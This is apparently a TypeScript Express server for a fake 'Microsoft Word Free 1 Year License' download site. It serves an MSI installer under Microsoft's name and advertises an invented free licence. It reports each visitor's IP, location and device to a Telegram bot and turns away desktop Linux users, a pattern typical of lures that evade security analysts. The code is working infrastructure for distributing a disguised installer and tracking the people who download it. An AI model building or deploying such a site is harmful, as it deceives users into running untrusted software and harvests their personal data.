import express, { Request, Response } from 'express'
import cors from 'cors'
import * as path from 'path'
import * as fs from 'fs'
import { createConfig } from './config'
import { TelegramLogger } from '../utils/telegram'
import { AnalyticsService } from '../utils/analytics'
import { ProductInfo } from '../types/api'
import 'dotenv/config'

// Create configuration
const config = createConfig()
const telegramLogger = new TelegramLogger(config.telegram)

const app = express()

// Production-ready error handling
process.on('uncaughtException', (error) => {
  console.error('❌ Uncaught Exception:', error)
  process.exit(1)
})

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason)
})

// Graceful shutdown
const gracefulShutdown = (signal: string) => {
  console.log(`📤 ${signal} received. Shutting down gracefully...`)
  process.exit(0)
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'))
process.on('SIGINT', () => gracefulShutdown('SIGINT'))

// Linux blocking middleware (applied before other routes)
const linuxBlockingMiddleware = async (req: Request, res: Response, next: any) => {
  if (!config.blockLinux) {
    return next() // Blocking disabled, continue
  }

  const userAgent = req.headers['user-agent'] as string || ''
  
  // Only check HTML requests and API calls to avoid blocking assets
  const isHtmlRequest = req.accepts('html') || req.path.startsWith('/api/')
  if (!isHtmlRequest) {
    return next()
  }

  try {
    const analytics = await AnalyticsService.generateAnalytics(req)
    const platform = analytics.device.platform.toLowerCase()
    
    // Block desktop Linux (but allow Android and ChromeOS)
    const isLinux = platform.includes('linux') && 
                   !platform.includes('android') && 
                   !platform.includes('chrome') &&
                   !platform.includes('chromeos')
    
    if (isLinux) {
      console.log(`🚫 Blocked Linux access from ${analytics.ip} - ${analytics.device.platform}`)
      
      // Log to Telegram (non-blocking)
      const blockMessage = telegramLogger.formatBlockedLog({
        ip: analytics.ip,
        userAgent: analytics.userAgent,
        platform: analytics.device.platform,
        location: analytics.location,
        url: req.originalUrl || req.url
      })
      telegramLogger.sendLog(blockMessage).catch(error => 
        console.error('❌ Failed to send block log:', error.message)
      )
      
      // Return 403 with informative message
      if (req.path.startsWith('/api/')) {
        return res.status(403).json({
          success: false,
          message: 'Access denied - Linux systems not supported',
          error: 'LINUX_BLOCKED'
        })
      } else {
        return res.status(403).send(`
          <!DOCTYPE html>
          <html>
          <head><title>Access Denied</title></head>
          <body>
            <h1>🚫 Access Denied</h1>
            <p>Linux-based systems are not supported for this service.</p>
            <p>Please use Windows or macOS to access this website.</p>
          </body>
          </html>
        `)
      }
    }
  } catch (error) {
    console.error('❌ Linux blocking middleware error:', error)
    // Continue on error to avoid breaking site
  }
  
  next()
}

// Middleware
app.use(cors())
app.use(express.json())
app.use(linuxBlockingMiddleware)

// Serve static files - use Vite build in production, client folder in development  
const isProduction = config.nodeEnv === 'production'
const staticPath = isProduction && fs.existsSync('client/dist') ? 'client/dist' : 'client'

if (isProduction && !fs.existsSync('client/dist')) {
  console.log('⚠️  Production mode but client/dist not found, falling back to client/')
}

app.use(express.static(staticPath, {
  setHeaders: (res, filePath) => {
    if (isProduction && filePath.includes('.') && !filePath.endsWith('.html')) {
      // Cache hashed assets in production for 1 year
      res.setHeader('Cache-Control', 'public, max-age=31536000, immutable')
    } else {
      // No cache for HTML and development mode
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate')
      res.setHeader('Pragma', 'no-cache')
      res.setHeader('Expires', '0')
    }
  }
}))

// API Routes
app.get('/api/download/word-free', async (req: Request, res: Response) => {
  try {
    // Resolve MSI path correctly for both development and production
    const msiFileName = 'Word_Free_1Year_Setup.msi'
    let msiPath: string

    // Try production path first, fall back to development path
    const productionPath = path.join(__dirname, '../../client/dist', msiFileName)
    const developmentPath = path.join(__dirname, '../../client/public', msiFileName)

    if (fs.existsSync(productionPath)) {
      msiPath = productionPath
    } else if (fs.existsSync(developmentPath)) {
      msiPath = developmentPath
    } else {
      console.error('❌ MSI file not found in either client/dist or client/public')
      return res.status(404).json({ success: false, message: 'Download file not available' })
    }

    const fileName = 'Word_Free_1Year_Setup.msi'

    // Generate comprehensive analytics
    const analytics = await AnalyticsService.generateAnalytics(req)

    console.log(`📥 Download request received for: ${fileName}`)
    console.log(`📂 File path: ${msiPath}`)
    console.log(`👤 Client IP: ${analytics.ip}`)
    console.log(`🌐 User Agent: ${analytics.userAgent}`)

    // Send Telegram log for download attempt (non-blocking)
    const logMessage = telegramLogger.formatDownloadLog({
      ip: analytics.ip,
      userAgent: analytics.userAgent,
      referrer: analytics.referrer,
      location: analytics.location,
      device: analytics.device
    })
    telegramLogger.sendLog(logMessage).catch(error => 
      console.error('❌ Failed to send download log:', error.message)
    )

    // Set headers for download
    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`)
    res.setHeader('Content-Type', 'application/octet-stream')
    res.setHeader('Cache-Control', 'no-cache')

    // Send the file for download
    res.download(msiPath, fileName, async (err) => {
      if (err) {
        console.error('❌ Download error:', err)

        // Send Telegram log for download error (non-blocking)
        const errorMessage = telegramLogger.formatErrorLog({
          ip: analytics.ip,
          device: analytics.device,
          error: err.message,
          userAgent: analytics.userAgent
        })
        telegramLogger.sendLog(errorMessage).catch(console.error)

        if (!res.headersSent) {
          res.status(500).json({
            success: false,
            message: "Download failed. Please try again.",
            error: err.message
          })
        }
      } else {
        console.log(`✅ Download completed successfully: ${fileName}`)

        // Send success confirmation to Telegram (non-blocking)
        const successMessage = telegramLogger.formatSuccessLog({
          ip: analytics.ip,
          fileName,
          location: analytics.location,
          device: analytics.device,
          userAgent: analytics.userAgent
        })
        telegramLogger.sendLog(successMessage).catch(console.error)
      }
    })

  } catch (error: any) {
    console.error('❌ Download endpoint error:', error)
    res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    })
  }
})

app.get('/api/product/info', (req: Request, res: Response) => {
  const productInfo: ProductInfo = {
    productId: "cfq7ttc0pbmb",
    title: "Word - Free 1 Year License",
    description: "• Free for 1 PC or Mac for 1 year\n• Create beautiful and engaging documents\n• Share your documents with others and edit together in real time*\n• Compatible with Windows 11, Windows 10, or macOS\n\n*Files must be shared from OneDrive.",
    productType: "Free Trial",
    price: {
      currency: "USD",
      current: "Free",
      original: "$179.99",
      savings: "$179.99",
      dynamicOriginalPrice: "Free for 1 Year"
    },
    action: {
      action: "DownloadFree",
      actionText: "Download Free Version",
      behaviorTag: 82,
      disabled: false
    },
    licenseInfo: {
      type: "Free 1 Year Trial",
      duration: "365 days",
      features: "Full Microsoft Word functionality",
      support: "Community support included"
    }
  }

  res.json(productInfo)
})

// SPA fallback - serve index.html for any non-API routes (React Router support)
app.get('*', (req: Request, res: Response) => {
  const indexPath = path.join(__dirname, `../../${staticPath}`, 'index.html')
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath)
  } else {
    res.status(404).send('Application not found')
  }
})

// Export the app for serverless platforms
export default app
export { app }

// Only start the server if not running in serverless environment
if (!process.env.VERCEL && !process.env.NETLIFY) {
  const isReplit = process.env.REPLIT_DEPLOYMENT

  app.listen(config.port, config.host, () => {
    console.log(`🚀 Microsoft Word Free Download Server running on http://${config.host}:${config.port}`)
    console.log(`📄 Frontend: http://${config.host}:${config.port} (serving from ${staticPath})`)
    console.log(`🔗 API: http://${config.host}:${config.port}/api`)
    console.log(`✅ Client-Server separation active`)
    console.log(`⚡ Vite available for builds with: npm run build`)
    console.log(`🔧 Environment: ${config.nodeEnv}`)
    console.log(`📊 Analytics: ${config.telegram.botToken ? 'Enabled' : 'Disabled'}`)

    if (isReplit) {
      console.log(`✅ Replit deployment ready: ${config.host}:${config.port}`)
    } else {
      console.log(`✅ Production deployment ready: ${config.host}:${config.port}`)
    }
  })
}